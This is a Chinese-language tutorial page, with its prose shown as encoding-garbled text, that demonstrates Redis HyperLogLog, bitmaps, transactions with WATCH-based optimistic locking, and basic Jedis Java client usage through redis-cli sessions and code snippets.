<p>Redis HyperLogLog æ˜¯ç”¨æ¥åšåŸºæ•°ç»Ÿè®¡çš„ç®—æ³•ï¼ŒHyperLogLog çš„ä¼˜ç‚¹æ˜¯ï¼Œåœ¨è¾“å…¥å…ƒç´ çš„æ•°é‡æˆ–è€…ä½“ç§¯éå¸¸éå¸¸å¤§æ—¶ï¼Œè®¡ç®—åŸºæ•°æ‰€éœ€çš„ç©ºé—´æ€»æ˜¯å›ºå®šçš„ã€å¹¶ä¸”æ˜¯å¾ˆå°çš„ã€‚</p>
<p>åœ¨ Redis é‡Œé¢ï¼Œæ¯ä¸ª HyperLogLog é”®åªéœ€è¦èŠ±è´¹ 12 KB å†…å­˜ï¼Œå°±å¯ä»¥è®¡ç®—æ¥è¿‘ 2^64 ä¸ªä¸åŒå…ƒç´ çš„åŸº æ•°ã€‚è¿™å’Œè®¡ç®—åŸºæ•°æ—¶ï¼Œå…ƒç´ è¶Šå¤šè€—è´¹å†…å­˜å°±è¶Šå¤šçš„é›†åˆå½¢æˆé²œæ˜å¯¹æ¯”ã€‚</p>
<p>ä½†æ˜¯ï¼Œå› ä¸º HyperLogLog åªä¼šæ ¹æ®è¾“å…¥å…ƒç´ æ¥è®¡ç®—åŸºæ•°ï¼Œè€Œä¸ä¼šå‚¨å­˜è¾“å…¥å…ƒç´ æœ¬èº«ï¼Œæ‰€ä»¥ HyperLogLog ä¸èƒ½åƒé›†åˆé‚£æ ·ï¼Œè¿”å›è¾“å…¥çš„å„ä¸ªå…ƒç´ ã€‚</p>
<p><strong>ç½‘é¡µçš„UV ä¸€ä¸ªäººè®¿é—®ä¸€ä¸ªç½‘ç«™å¤šæ¬¡ï¼Œä½†æ˜¯è¿˜æ˜¯ç®—ä½œä¸€ä¸ªäººï¼ï¼‰</strong></p>
<p>ä¼ ç»Ÿçš„æ–¹å¼ï¼Œ set ä¿å­˜ç”¨æˆ·çš„idï¼Œç„¶åå°±å¯ä»¥ç»Ÿè®¡ set ä¸­çš„å…ƒç´ æ•°é‡ä½œä¸ºæ ‡å‡†åˆ¤æ–­ !</p>
<p>è¿™ä¸ªæ–¹å¼å¦‚æœä¿å­˜å¤§é‡çš„ç”¨æˆ·idï¼Œå°±ä¼šæ¯”è¾ƒéº»çƒ¦ï¼æˆ‘ä»¬çš„ç›®çš„æ˜¯ä¸ºäº†è®¡æ•°ï¼Œè€Œä¸æ˜¯ä¿å­˜ç”¨æˆ·idï¼›</p>
<blockquote>
<p>æµ‹è¯•ä½¿ç”¨</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; pfadd mykey a b c d e  <span class="comment"># åˆ›å»ºç¬¬ä¸€ç»„å…ƒç´  mykey</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; pfcount mykey <span class="comment"># ç»Ÿè®¡ mykey å…ƒç´ çš„åŸºæ•°æ•°é‡</span></span><br><span class="line">(<span class="built_in">integer</span>) 5</span><br><span class="line">127.0.0.1:6379&gt; pfadd mykey2 e d f g h k  <span class="comment"># åˆ›å»ºç¬¬äºŒç»„å…ƒç´  mykey2</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; pfcount mykey2</span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">127.0.0.1:6379&gt; pfmerge mykey3 mykey mykey2 <span class="comment"># åˆå¹¶ä¸¤ç»„ mykey mykey2 ---&gt; mykey3  å¹¶é›†</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; pfcount mykey3</span><br><span class="line">(<span class="built_in">integer</span>) 9</span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<p>0.81% é”™è¯¯ç‡ï¼ ç»Ÿè®¡UVä»»åŠ¡ï¼Œå¯ä»¥å¿½ç•¥ä¸è®¡çš„ï¼</p>
<p>å¦‚æœå…è®¸å®¹é”™ï¼Œé‚£ä¹ˆä¸€å®šå¯ä»¥ä½¿ç”¨ Hyperloglog </p>
<p>å¦‚æœä¸å…è®¸å®¹é”™ï¼Œå°±ä½¿ç”¨ set æˆ–è€…è‡ªå·±çš„æ•°æ®ç±»å‹å³å¯ï¼</p>
<h2 id="3ã€bitmap"><a href="#3ã€bitmap" class="headerlink" title="3ã€bitmap"></a>3ã€bitmap</h2><p>BitMap åŸæœ¬çš„å«ä¹‰æ˜¯ç”¨ä¸€ä¸ªæ¯”ç‰¹ä½æ¥æ˜ å°„æŸä¸ªå…ƒç´ çš„çŠ¶æ€ã€‚ç”±äºä¸€ä¸ªæ¯”ç‰¹ä½åªèƒ½è¡¨ç¤º 0 å’Œ 1 ä¸¤ç§çŠ¶æ€ï¼Œæ‰€ä»¥ BitMap èƒ½æ˜ å°„çš„çŠ¶æ€æœ‰é™ï¼Œä½†æ˜¯ä½¿ç”¨æ¯”ç‰¹ä½çš„ä¼˜åŠ¿æ˜¯èƒ½å¤§é‡çš„èŠ‚çœå†…å­˜ç©ºé—´ã€‚</p>
<blockquote>
<p>åº”ç”¨åœºæ™¯</p>
</blockquote>
<ul>
<li>ç”¨æˆ·ç­¾åˆ°</li>
<li>ç»Ÿè®¡æ´»è·ƒç”¨æˆ·ï¼ˆç”¨æˆ·ç™»é™†æƒ…å†µï¼‰</li>
<li>ç»Ÿè®¡ç”¨æˆ·æ˜¯å¦åœ¨çº¿</li>
<li>å®ç°å¸ƒéš†è¿‡æ»¤å™¨</li>
</ul>
<blockquote>
<p>æµ‹è¯•</p>
</blockquote>
<p>ä½¿ç”¨bitmap æ¥è®°å½• å‘¨ä¸€åˆ°å‘¨æ—¥çš„æ‰“å¡ï¼</p>
<p>7å¤©æ‰“å¡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; setbit sign 1 1</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit sign 2 1</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit sign 3 0</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit sign 4 0</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit sign 5 0</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit sign 6 0</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; setbit sign 7 1</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æŸä¸€å¤©çš„æ‰“å¼€æƒ…å†µ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; getbit sign 1</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; getbit sign 2</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; getbit sign 4</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç»Ÿè®¡æ“ä½œï¼Œç»Ÿè®¡ æ‰“å¡çš„å¤©æ•°ï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; bitcount sign  <span class="comment"># ç»Ÿè®¡è¿™å‘¨çš„æ‰“å¡è®°å½•ï¼Œå°±å¯ä»¥çœ‹åˆ°æ˜¯å¦æœ‰å…¨å‹¤ï¼</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>



<h1 id="äº”ã€äº‹åŠ¡"><a href="#äº”ã€äº‹åŠ¡" class="headerlink" title="äº”ã€äº‹åŠ¡"></a>äº”ã€äº‹åŠ¡</h1><p>Redis äº‹åŠ¡æœ¬è´¨ï¼šä¸€ç»„å‘½ä»¤çš„é›†åˆï¼ ä¸€ä¸ªäº‹åŠ¡ä¸­çš„æ‰€æœ‰å‘½ä»¤éƒ½ä¼šè¢«åºåˆ—åŒ–ï¼Œåœ¨äº‹åŠ¡æ‰§è¡Œè¿‡ç¨‹çš„ä¸­ï¼Œä¼šæŒ‰ç…§é¡ºåºæ‰§è¡Œï¼</p>
<p>ä¸€æ¬¡æ€§ã€é¡ºåºæ€§ã€æ’ä»–æ€§ï¼æ‰§è¡Œä¸€ç³»åˆ—çš„å‘½ä»¤ï¼</p>
<p>Redisäº‹åŠ¡æ²¡æœ‰æ²¡æœ‰éš”ç¦»çº§åˆ«çš„æ¦‚å¿µï¼</p>
<p>æ‰€æœ‰çš„å‘½ä»¤åœ¨äº‹åŠ¡ä¸­ï¼Œå¹¶æ²¡æœ‰ç›´æ¥è¢«æ‰§è¡Œï¼åªæœ‰å‘èµ·æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œï¼<code>exec</code></p>
<p><strong>Rediså•æ¡å‘½ä»¤å¼ä¿è¯åŸå­æ€§çš„ï¼Œä½†æ˜¯äº‹åŠ¡ä¸ä¿è¯åŸå­æ€§ï¼</strong></p>
<p>Redis äº‹åŠ¡å¯ä»¥ä¸€æ¬¡æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œ å¹¶ä¸”å¸¦æœ‰ä»¥ä¸‹ä¸‰ä¸ªé‡è¦çš„ä¿è¯ï¼š</p>
<ul>
<li>æ‰¹é‡æ“ä½œåœ¨å‘é€ EXEC å‘½ä»¤å‰è¢«æ”¾å…¥é˜Ÿåˆ—ç¼“å­˜</li>
<li>æ”¶åˆ° EXEC å‘½ä»¤åè¿›å…¥äº‹åŠ¡æ‰§è¡Œï¼Œäº‹åŠ¡ä¸­ä»»æ„å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œå…¶ä½™çš„å‘½ä»¤ä¾ç„¶è¢«æ‰§è¡Œ</li>
<li>åœ¨äº‹åŠ¡æ‰§è¡Œè¿‡ç¨‹ï¼Œå…¶ä»–å®¢æˆ·ç«¯æäº¤çš„å‘½ä»¤è¯·æ±‚ä¸ä¼šæ’å…¥åˆ°äº‹åŠ¡æ‰§è¡Œå‘½ä»¤åºåˆ—ä¸­</li>
</ul>
<p>ä¸€ä¸ªäº‹åŠ¡ä»å¼€å§‹åˆ°æ‰§è¡Œä¼šç»å†ä»¥ä¸‹ä¸‰ä¸ªé˜¶æ®µï¼š</p>
<ul>
<li>å¼€å¯äº‹åŠ¡ï¼ˆmultiï¼‰</li>
<li>å‘½ä»¤å…¥é˜Ÿï¼ˆâ€¦â€¦ï¼‰</li>
<li>æ‰§è¡Œäº‹åŠ¡ï¼ˆexecï¼‰</li>
</ul>
<blockquote>
<p>æ­£å¸¸æ‰§è¡Œäº‹åŠ¡</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; multi  <span class="comment"># å¼€å¯äº‹åŠ¡</span></span><br><span class="line">OK</span><br><span class="line"><span class="comment"># å‘½åå…¥é˜Ÿ</span></span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k1 v1</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k2 v2</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; get k2</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k3 v3</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">exec</span> <span class="comment"># æ‰§è¡Œäº‹åŠ¡</span></span><br><span class="line">1) OK</span><br><span class="line">2) OK</span><br><span class="line">3) <span class="string">&quot;v2&quot;</span></span><br><span class="line">4) OK</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ”¾å¼ƒäº‹åŠ¡</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">discard <span class="comment"># å–æ¶ˆäº‹åŠ¡</span></span><br><span class="line"><span class="comment"># å–æ¶ˆäº‹åŠ¡åï¼Œäº‹åŠ¡ä¸­çš„å‘½ä»¤éƒ½ä¸ä¼šå»æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>ç¼–è¯‘å‹å¼‚å¸¸ï¼ˆä»£ç æœ‰è¯¯ï¼å‘½ä»¤æœ‰è¯¯ï¼ï¼‰äº‹åŠ¡ä¸­æ‰€æœ‰çš„å‘½ä»¤éƒ½ä¸ä¼šæ‰§è¡Œ</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; multi <span class="comment"># å¼€å¯äº‹åŠ¡</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k1 v1</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k2 v2</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k3 v3</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; setget k3 <span class="comment"># æ²¡æœ‰è¿™ä¸ªå‘½ä»¤</span></span><br><span class="line">(error) ERR unknown <span class="built_in">command</span> <span class="string">&#x27;setget&#x27;</span>, with args beginning with: <span class="string">&#x27;k3&#x27;</span> </span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">exec</span> <span class="comment"># æ‰§è¡Œäº‹åŠ¡æŠ¥é”™ï¼</span></span><br><span class="line">(error) EXECABORT Transaction discarded because of previous errors.</span><br><span class="line">127.0.0.1:6379&gt; get k1 <span class="comment"># æ‰€æœ‰çš„å‘½ä»¤éƒ½ä¸ä¼šè¢«æ‰§è¡Œï¼</span></span><br><span class="line">(nil)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿è¡Œæ—¶å¼‚å¸¸ï¼Œå¦‚æœäº‹åŠ¡é˜Ÿåˆ—ä¸­å­˜åœ¨è¯­æ³•æ€§é”™è¯¯ï¼Œé‚£ä¹ˆæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œå…¶ä»–å‘½ä»¤æ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„ï¼Œé”™è¯¯å‘½ä»¤æŠ›å‡ºé”™è¯¯</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k1 v1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; multi <span class="comment"># å¼€å¯äº‹åŠ¡</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; incr k1 <span class="comment"># æ‰§è¡Œçš„æ—¶å€™ä¼šå¤±è´¥</span></span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k2 v2</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">set</span> k3 v3</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; get k3</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">exec</span> <span class="comment"># æ‰§è¡Œäº‹åŠ¡ï¼Œè™½ç„¶ç¬¬ä¸€æ¡å‘½ä»¤æŠ¥é”™äº†ï¼Œä½†æ˜¯åé¢çš„ä¾æ—§æ­£å¸¸æ‰§è¡ŒæˆåŠŸäº†</span></span><br><span class="line">1) (error) ERR value is not an <span class="built_in">integer</span> or out of range</span><br><span class="line">2) OK</span><br><span class="line">3) OK</span><br><span class="line">4) <span class="string">&quot;v3&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; get k2</span><br><span class="line"><span class="string">&quot;v2&quot;</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>ç›‘æ§ watch</p>
</blockquote>
<ul>
<li><p>æ‚²è§‚é”</p>
<p>å¾ˆæ‚²è§‚ï¼Œè®¤ä¸ºä»€ä¹ˆæ—¶å€™éƒ½ä¼šå‡ºé—®é¢˜ï¼Œæ— è®ºåšä»€ä¹ˆéƒ½ä¼šåŠ é”ï¼</p>
</li>
<li><p>ä¹è§‚é”</p>
<p>å¾ˆä¹è§‚ï¼Œè®¤ä¸ºä»€ä¹ˆæ—¶å€™éƒ½ä¸ä¼šå‡ºé—®é¢˜ï¼Œæ‰€ä»¥ä¸ä¼šä¸Šé”ï¼Œæ›´æ–°æ•°æ®çš„æ—¶å€™å»åˆ¤æ–­ä¸€ä¸‹ï¼Œå†æ­¤æœŸé—´æ˜¯å¦æœ‰äººä¿®æ”¹è¿‡è¿™ä¸ªæ•°æ®</p>
<p>è·å–version</p>
<p>æ›´æ–°çš„æ—¶å€™å¸¦ä¸Šversionæ¡ä»¶</p>
</li>
</ul>
<blockquote>
<p>redisç›‘è§†</p>
</blockquote>
<p>æ­£å¸¸æƒ…å†µ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> money 100 <span class="comment"># ç°åœ¨æœ‰100å—é’±</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> out 0 <span class="comment"># èŠ±å‡ºå»äº†0å…ƒ</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; watch money <span class="comment"># ç›‘è§†money</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; multi <span class="comment">#å¼€å¯äº‹åŠ¡</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; decrby money 20 <span class="comment"># èŠ±äº†20ï¼Œä½™é¢-20</span></span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; incrby out 20 <span class="comment"># èŠ±å‡ºå»çš„é’±+20</span></span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">exec</span> <span class="comment"># æ‰§è¡Œäº‹åŠ¡</span></span><br><span class="line">1) (<span class="built_in">integer</span>) 80 <span class="comment"># ç»“æœï¼šä½™é¢è¿˜æœ‰80</span></span><br><span class="line">2) (<span class="built_in">integer</span>) 20 <span class="comment"># ç»“æœï¼šèŠ±å‡ºå»äº†20</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<p>å¤±è´¥æƒ…å†µï¼Œæ¨¡æ‹Ÿå¤šçº¿ç¨‹ä¿®æ”¹å€¼ , ä½¿ç”¨watch å¯ä»¥å½“åšredisçš„ä¹è§‚é”æ“ä½œï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; watch money <span class="comment"># ç›‘è§†money</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; multi <span class="comment"># å¼€å¯äº‹åŠ¡</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; decrby money 10 <span class="comment"># åˆèŠ±äº†10ï¼Œä½™é¢-10</span></span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; incrby out 10 <span class="comment"># èŠ±å‡ºå»çš„é’±+10</span></span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="comment"># exec è¿™é‡Œæš‚æ—¶ä¸æ‰§è¡Œäº‹åŠ¡</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸Šé¢æ‰§è¡Œäº‹åŠ¡ä¹‹å‰ï¼Œå¦å¤–ä¸€ä¸ªçº¿ç¨‹åˆå¾€moneyä¸­å……äº†100å—</p>
<p>é‡æ–°å¼€å¯ä¸€ä¸ªredisæœåŠ¡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;out&quot;</span></span><br><span class="line">2) <span class="string">&quot;money&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; get money</span><br><span class="line"><span class="string">&quot;80&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; incrby money 100 <span class="comment"># å……äº†100ï¼Œä½™é¢+100</span></span><br><span class="line">(<span class="built_in">integer</span>) 180</span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<p>å›åˆ°åŸæ¥çš„redisæœåŠ¡ï¼Œæ‰§è¡Œäº‹åŠ¡ï¼Œå‘ç°æ‰§è¡Œå¤±è´¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">exec</span> <span class="comment"># æ‰§è¡Œä¹‹å‰ï¼Œå¦å¤–ä¸€ä¸ªçº¿ç¨‹ï¼Œä¿®æ”¹äº†æˆ‘ä»¬çš„å€¼ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå°±ä¼šå¯¼è‡´äº‹åŠ¡æ‰§è¡Œå¤± è´¥ï¼</span></span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/94ebcbefd366a9f975240c018c79ab71--6aec--image-20240921095731846.png" alt="image-20240921095731846"></p>
<p>å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; unwatch <span class="comment"># 1.å¦‚æœå‘ç°äº‹åŠ¡æ‰§è¡Œå¤±è´¥ï¼Œå°±å…ˆè§£é”</span></span><br><span class="line">127.0.0.1:6379&gt; watch money <span class="comment"># 2.è·å–æœ€æ–°çš„å€¼ï¼Œå†æ¬¡ç›‘è§†ï¼Œselect version</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; multi</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379(TX)&gt; decrby money 10</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; incrby out 10</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379(TX)&gt; <span class="built_in">exec</span> <span class="comment"># å¯¹æ¯”ç›‘è§†çš„å€¼æ˜¯å¦å‘ç”Ÿäº†å˜åŒ–ï¼Œå¦‚æœæ²¡æœ‰å˜åŒ–ï¼Œå°±å¯ä»¥æ‰§è¡ŒæˆåŠŸï¼Œå¦‚æœå˜äº†å°±æ‰§è¡Œå¤±è´¥</span></span><br><span class="line">1) (<span class="built_in">integer</span>) 170</span><br><span class="line">2) (<span class="built_in">integer</span>) 30</span><br></pre></td></tr></table></figure>



<h1 id="å…­ã€jedis"><a href="#å…­ã€jedis" class="headerlink" title="å…­ã€jedis"></a>å…­ã€jedis</h1><p>ä»€ä¹ˆæ˜¯Jedis æ˜¯ Redis å®˜æ–¹æ¨èçš„ javaè¿æ¥å¼€å‘å·¥å…·ï¼ ä½¿ç”¨Java æ“ä½œRedis ä¸­é—´ä»¶ï¼å¦‚æœä½ è¦ä½¿ç”¨</p>
<p>javaæ“ä½œredisï¼Œé‚£ä¹ˆä¸€å®šè¦å¯¹Jedis ååˆ†çš„ç†Ÿæ‚‰ï¼</p>
<blockquote>
<p>æµ‹è¯•ä½¿ç”¨</p>
</blockquote>
<p>1ã€é¦–å…ˆå°±æ˜¯æ–°å»ºä¸€ä¸ªmavené¡¹ç›®ï¼Œå¯¼å…¥å¯¹åº”æ‰€éœ€è¦çš„ä¾èµ–</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/redis.clients/jedis --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2ã€ç”±äºæˆ‘ä»¬æ˜¯åœ¨windowsä¸Šè¿›è¡Œæµ‹è¯•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¼€å¯windowsçš„redisæœåŠ¡ç«¯å»æµ‹è¯•ä¸€ä¸‹ã€‚</p>
<p>3ã€ç¼–å†™ç®€å•çš„ä»£ç å»æµ‹è¯•redisçš„è¿æ¥</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Jedis</span> <span class="variable">jedis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jedis</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>);</span><br><span class="line">        System.out.println(jedis.ping());</span><br><span class="line">        jedis.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/31d26b20c93072dc06423796cb2898fb--370a--image-20240921134438489.png" alt="image-20240921134438489"></p>
<p>5ã€æµ‹è¯•åŠŸèƒ½ï¼ˆç®€å•ä½¿ç”¨ä¸€ä¸‹äº‹åŠ¡åŠŸèƒ½ï¼‰</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Transaction;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: ç±»æè¿°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: zyy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2023/04/20 17:02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTX</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿æ¥redis</span></span><br><span class="line">        <span class="type">Jedis</span> <span class="variable">jedis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jedis</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>);</span><br><span class="line">        <span class="comment">//æ¸…ç©ºkey</span></span><br><span class="line">        jedis.flushDB();</span><br><span class="line">        <span class="comment">//å¼€å¯äº‹åŠ¡</span></span><br><span class="line">        <span class="type">Transaction</span> <span class="variable">multi</span> <span class="operator">=</span> jedis.multi();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            multi.set(<span class="string">&quot;k1&quot;</span>, <span class="string">&quot;v1&quot;</span>);</span><br><span class="line">            multi.set(<span class="string">&quot;k2&quot;</span>, <span class="string">&quot;v2&quot;</span>);</span><br><span class="line">            <span class="comment">//è¿™é‡ŒæŠ›å‡ºå¼‚å¸¸ï¼Œåº”è¯¥äº‹åŠ¡æ‰§è¡Œå¤±è´¥</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//æ‰§è¡Œäº‹åŠ¡</span></span><br><span class="line">            multi.exec();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">//æ”¾å¼ƒäº‹åŠ¡</span></span><br><span class="line">            multi.discard();</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//è·å–keyå¯¹åº”çš„å€¼</span></span><br><span class="line">            System.out.println(jedis.get(<span class="string">&quot;k1&quot;</span>));</span><br><span class="line">            <span class="comment">//å…³é—­è¿æ¥</span></span><br><span class="line">            jedis.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/2d6155bbc2e8d5bd49448f0662266a75--97f2--image-20240921134812192.png" alt="image-20240921134812192"></p>
<p>äº‹åŠ¡æ‰§è¡Œå¤±è´¥ï¼Œæˆ‘ä»¬å°†å¼‚å¸¸ä»£ç æ³¨é‡Šåå†æ¬¡å»æ‰§è¡Œ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/16528c65767cc3261262bd29ce9df9de--7e3f--image-20240921134859639.png" alt="image-20240921134859639"></p>
